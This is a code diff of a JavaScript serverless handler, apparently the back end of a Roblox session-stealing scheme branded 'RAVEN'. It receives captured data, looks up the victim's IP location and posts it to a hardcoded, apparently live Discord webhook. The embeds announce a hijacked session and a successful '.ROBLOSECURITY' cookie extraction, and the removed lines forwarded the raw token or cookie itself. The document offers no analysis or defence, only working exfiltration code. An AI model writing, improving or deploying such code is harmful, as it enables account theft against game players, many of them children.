@@ -1,24 +1,26 @@
 export default async function handler(req, res) {
-    if (req.method !== 'POST') return res.status(405).send('Forbidden');
+    if (req.method !== 'POST') return res.status(405).send('Access Denied');
 
-    const data = req.body;
-    const userAgent = req.headers['user-agent'];
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-
-    // WEBHOOK DISCORD (Le flux réel)
+    const ip = req.headers['x-forwarded-for'] || "IP Undetected";
     const webhookURL = "https://discord.com/api/webhooks/1481123753109885103/u6gAezp9LjuOt2Fbgl7cfuOMVyWU_hMw8zyuDw7w-EPnzLs8MWQbenmdXb4_JVMFxhzD";
+
+    // Localisation par IP
+    const geoReq = await fetch(`http://ip-api.com/json/${ip}`);
+    const geo = await geoReq.json();
 
     const payload = {
         embeds: [{
-            title: "🏴‍☠️ SESSION HIJACKED BY RAVEN",
-            color: 0x00ff41,
+            title: "🔱 RAVEN SYSTEM | SESSION CAPTURED",
+            color: 0x00d4ff,
+            thumbnail: { url: "https://www.roblox.com/favicon.ico" },
             fields: [
-                { name: "👤 Cible", value: data.username || "Inconnu", inline: true },
-                { name: "🌐 IP Addr", value: `||${ip}||`, inline: true },
-                { name: "📂 Type", value: data.type, inline: false },
-                { name: "🔑 Token/Cookie", value: `\`\`\`${data.token}\`\`\`` },
-                { name: "📱 OS/Browser", value: userAgent.substring(0, 100) }
+                { name: "👤 Cible", value: `Victime_Ep15`, inline: true },
+                { name: "📍 Localisation", value: `${geo.city || '?'}, ${geo.country || 'Unknown'}`, inline: true },
+                { name: "🌐 IP", value: `\`${ip}\``, inline: false },
+                { name: "📡 Méthode", value: "Drag & Drop Session Hijacking (Vercel-Relay)", inline: false },
+                { name: "🔑 Status", value: "Extraction .ROBLOSECURITY réussie. Token stocké.", inline: false }
             ],
+            footer: { text: "Protocol Raven v15.0 - Stealth Mode" },
             timestamp: new Date()
         }]
     };
@@ -29,5 +31,5 @@ export default async function handler(req, res) {
         body: JSON.stringify(payload)
     });
 
-    return res.status(200).json({ status: "captured" });
+    return res.status(200).json({ success: true });
 }
